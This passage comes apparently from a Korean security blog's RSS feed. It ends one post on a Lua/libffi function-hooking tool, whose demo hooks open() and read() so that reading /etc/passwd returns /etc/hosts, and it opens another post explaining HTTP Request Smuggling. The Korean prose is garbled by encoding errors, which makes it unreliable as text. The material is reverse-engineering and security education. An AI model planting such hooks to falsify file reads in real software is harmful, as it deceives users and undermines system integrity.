            &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_touserdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unhandled argment type=%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_prep_cif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FFI_DEFAULT_ABI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type_sint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FFI_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ffi_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fnpointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushinteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luaì—ì„œ í˜¸ì¶œí•˜ëŠ” original_xxx ì›ë³¸ í•¨ìˆ˜ë“¤ì€ ëª¨ë‘ original_function_handler í•¨ìˆ˜ë¡œ í˜¸ì¶œë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•¨ìˆ˜ êµ¬ë¶„ì€ Lua í•¨ìˆ˜ëª…ì„ í†µí•´ ê°€ëŠ¥í•˜ê³  find_by_original_functionì„ í†µí•´ HookChain êµ¬ì¡°ì²´ ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Luaë¡œë¶€í„° ì „ë‹¬ë°›ì€ ì¸ìì˜ ì†ì„±ì´ LUA_TLIGHTUSERDATAì´ë©´ lua_touserdataë¡œ ë³€í™˜í•´ ê·¸ëŒ€ë¡œ ì›ë³¸ í•¨ìˆ˜ë¡œ ë„˜ê²¨ì£¼ê³  longí˜•ì´ë‚˜ ë¬¸ìì—´ ê°™ì€ ë°ì´í„°ë¡œ í™•ì¸ë˜ë©´ C í•¨ìˆ˜ë¡œ í˜¸ì¶œì´ ê°€ëŠ¥í•˜ë„ë¡ ì ì ˆí•œ íƒ€ì…ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë§ˆì§€ë§‰ìœ¼ë¡œ HookChain êµ¬ì¡°ì²´ë¥¼ í†µí•´ íšë“í•œ ì›ë˜ í•¨ìˆ˜ì— ëŒ€í•œ í¬ì¸í„°ì™€ ì¸ì ì •ë³´ë¡œ í•¨ìˆ˜ë¥¼ ë™ì ìœ¼ë¡œ í˜¸ì¶œí•´ì•¼ í•˜ëŠ” ë¬¸ì œë¥¼ ffi ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ê²°í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;4-ì‹¤í–‰--í…ŒìŠ¤íŠ¸&quot;&gt;4. ì‹¤í–‰ / í…ŒìŠ¤íŠ¸&lt;/h1&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;new_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_open(%s, %d) =&amp;gt; %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;new_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/etc/hosts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_read(%d, %s, %d) =&amp;gt; %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;new_open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;original_open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;new_read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;original_read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì‘ì„±ëœ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ readí•˜ëŠ” ëª¨ë“  ë‚´ìš©ì„ &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;íŒŒì¼ì˜ ë‚´ìš©ìœ¼ë¡œ ì¡°ì‘í•˜ì—¬ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;í›„í‚¹ í›„ open, read í•¨ìˆ˜ í˜¸ì¶œ&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[%d]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf =&amp;gt; [%s]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/1860fb18-5071-4472-acb5-1b67e938ab2f/8646f3a2-35a0-4fa6-9cc7-70a7147767f3.png&quot; alt=&quot;/assets/1860fb18-5071-4472-acb5-1b67e938ab2f/8646f3a2-35a0-4fa6-9cc7-70a7147767f3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì‹¤í–‰ê²°ê³¼, &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; ë‚´ìš© ëŒ€ì‹  &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;ë¡œ ì¡°ì‘ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;5-ë§ˆì¹˜ë©°&quot;&gt;5. ë§ˆì¹˜ë©°&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;Luaê°€ ê°œë°œì ì…ì¥ì—ì„œëŠ” C/C++ì— ì´ì‹í•˜ê¸° í¸í•˜ê³  ê°€ë²¼ì›Œ í™œìš©í•˜ê¸°ì—ëŠ” ì¢‹ì•˜ì§€ë§Œ ì‚¬ìš©ì ì…ì¥ì—ì„œëŠ” ìƒì†Œí•œ ë¬¸ë²•ì¼ ìˆ˜ ìˆê³  JSë‚˜ Pythonê°™ì´ ê¸°ë³¸ì ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë§ì´ ì§€ì›í•˜ì§€ì•ŠëŠ” ê²ƒì— ëŒ€í•´ì„œëŠ” ì•„ì‰¬ì›€ì´ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Embedded JSë‚˜ Pythonìœ¼ë¡œ ìœ„ì™€ ë¹„ìŠ·í•œ ê¸°ëŠ¥ì„ êµ¬í˜„í•œë‹¤ê±°ë‚˜ Luaë¡œ ì‚¬ìš©ìë¥¼ ìœ„í•œ ìŠ¤í¬ë¦½íŠ¸ ê¸°ëŠ¥ì„ êµ¬í˜„í•´ì•¼í•  ì¼ì´ ìˆë‹¤ë©´ í•´ë‹¹ ë¬¸ì„œë¥¼ ì°¸ê³ í•˜ë©´ ì¢‹ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/Lua</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/Lua</guid>
        
        <category>reversing</category>
        
        
      </item>
    
      <item>
        <title>HTTP Request Smuggling &amp; HTTP Desync Attack</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ë°•ì˜ì„±&lt;/p&gt;

&lt;h2 id=&quot;1-ê°œìš”&quot;&gt;1. ê°œìš”&lt;/h2&gt;

&lt;p&gt;ë³¸ ë¬¸ì„œëŠ” HTTP Request Smuggling ë˜ëŠ” HTTP Desync Attack ì´ë¼ê³  ë¶ˆë¦¬ëŠ” ê³µê²©ì— ëŒ€í•´ ì„œìˆ í•œ ë¬¸ì„œì…ë‹ˆë‹¤. ìµœê·¼ ë§ì€ ì›¹ì‚¬ì´íŠ¸ì—ì„œ ì„œë²„ë¡œ ì „ì†¡ë˜ëŠ” íŠ¸ë˜í”½ ë¶€ë‹´ì„ ì¤„ì´ê³  ì†ë„ë¥¼ í–¥ìƒì‹œí‚¤ê¸° ìœ„í•´ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œë¥¼ ë§ì´ ì‚¬ìš©í•©ë‹ˆë‹¤. HTTP Request Smuggling ì·¨ì•½ì ì€ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œì™€ ë°±ì—”ë“œ ì„œë²„ ê°„ì˜ HTTP Request íŒ¨í‚·ì„ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì˜ ì°¨ì´ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;2-íƒ€ì„ë¼ì¸&quot;&gt;2. íƒ€ì„ë¼ì¸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;2005ë…„&lt;/strong&gt; / Watchfire ì†Œì† Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrinì´ HTTP Request Smugglingì— ëŒ€í•œ ë³´ê³ ì„œë¥¼ ì‘ì„±&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;2016ë…„&lt;/strong&gt; / DEFCON 24ì—ì„œ regileroê°€ Hiding Wookiees In HTTP ë¼ëŠ” ì£¼ì œë¡œ HTTP Request Smuggling ì·¨ì•½ì ì— ëŒ€í•´ ë°œí‘œ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;2019ë…„&lt;/strong&gt; / BlackHat USA 2019ì—ì„œ PortSwiggerì˜ James Kettleê°€ HTTP Desync Attacks : Smashing into the Cell Next Doorë¼ëŠ” ì£¼ì œë¡œ HTTP Request Smuggling ì·¨ì•½ì ì— ëŒ€í•œ ë¦¬ì–¼ì›”ë“œ ë²„ê·¸í—ŒíŒ… ì‚¬ë¡€ë“¤ê³¼ ì·¨ì•½ì  íƒì§€ ìë™í™” ë°©ë²• ë° íˆ´ ë°œí‘œ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-ì·¨ì•½ì -ë°œìƒ-ì›ë¦¬&quot;&gt;3. ì·¨ì•½ì  ë°œìƒ ì›ë¦¬&lt;/h2&gt;

&lt;h3 id=&quot;3-1-http-10-ì´í•˜-ë²„ì „&quot;&gt;3-1. HTTP 1.0 ì´í•˜ ë²„ì „&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/40535ce9-af40-4cea-81fe-2d1b77c11bea/5b0ff379-427f-4347-a7ec-dc6653d177b7.png&quot; alt=&quot;/assets/40535ce9-af40-4cea-81fe-2d1b77c11bea/5b0ff379-427f-4347-a7ec-dc6653d177b7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTTP 1.0 ì´í•˜ ë²„ì „ì—ì„œëŠ” í”„ë¡œí† ì½œ ì„¤ê³„ìƒ 1ê°œì˜ TCP/IP ì—°ê²° ë‹¹ í•˜ë‚˜ì˜ ë¬¸ì„œë¥¼ ë°›ì•„ì˜¬ ìˆ˜ ìˆë„ë¡ êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤. í˜ì´ì§€ ë‚´ë¶€ì— í¬í•¨ëœ ì—¬ëŸ¬ ë¬¸ì„œë¥¼ ìš”ì²­í•  ê²½ìš°, ë¬¸ì„œ ë§ˆë‹¤ ë§¤ë²ˆ ì—°ê²°ì„ ìƒì„±í•˜ê³  ëŠëŠ” ë°©ì‹ì…ë‹ˆë‹¤. ì´ëŠ” ë„¤íŠ¸ì›Œí¬ ë¹„ìš© ì¸¡ë©´ì—ì„œ ë§ì€ ë¹„ìš©ì„ ì†Œëª¨í•˜ë©° ë§¤ìš° ë¹„íš¨ìœ¨ì ì¸ êµ¬ì¡°ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-2-http-11-ë²„ì „-ì´í›„&quot;&gt;3-2. HTTP 1.1 ë²„ì „ ì´í›„&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/361c4b4d-faa8-425b-8eb5-ad8373eecfcd/59e86881-1bf8-4c9d-b2a3-e24cb3991be3.png&quot; alt=&quot;/assets/361c4b4d-faa8-425b-8eb5-ad8373eecfcd/59e86881-1bf8-4c9d-b2a3-e24cb3991be3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTTP 1.1ë¶€í„°ëŠ” Keep-Aliveê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. HTTP 1.1ì—ì„œëŠ” â€œConnection: keep-aliveâ€ í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šë”ë¼ë„ ëª¨ë“  ì—°ê²°ì— Keep-Aliveë¥¼ ê¸°ë³¸ ì ìš©í•˜ë„ë¡ êµ¬í˜„ë˜ì–´ ìˆìœ¼ë©°, í•´ì œì‹œì— â€œConnection: closeâ€ í—¤ë”ë¥¼ ëª…ì‹œì ìœ¼ë¡œ ì‚¬ìš©í•  ê²½ìš°ì—ë§Œ ì—°ê²°ì´ ì¢…ë£Œë˜ë„ë¡ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì—°ì†ëœ ë¬¸ì„œ ìš”ì²­ì‹œ Handshake ê³¼ì •ì´ ìƒëµë˜ë¯€ë¡œ ìƒë‹¹í•œ ì„±ëŠ¥ í–¥ìƒì„ ê¸°ëŒ€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¨ìˆœ ì´ë¯¸ì§€, javascript, css ê°™ì€ ë‚´ìš©ì´ ë³€ê²½ë˜ì§€ ì•ŠëŠ” ì •ì  ìì›(static file)ì— ëŒ€í•´ì„œëŠ” Keep Aliveì„ ì‚¬ìš©í•  ê²½ìš° ì•½ 50%ì˜ ì„±ëŠ¥ í–¥ìƒì„ ë³´ì¸ë‹¤ê³  í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/98f1b417-04b0-4aa3-b487-8f256cb1f418/ba47bb14-ba5d-4263-9dcd-f86144f59d55.png&quot; alt=&quot;/assets/98f1b417-04b0-4aa3-b487-8f256cb1f418/ba47bb14-ba5d-4263-9dcd-f86144f59d55.png&quot; /&gt;&lt;/p&gt;

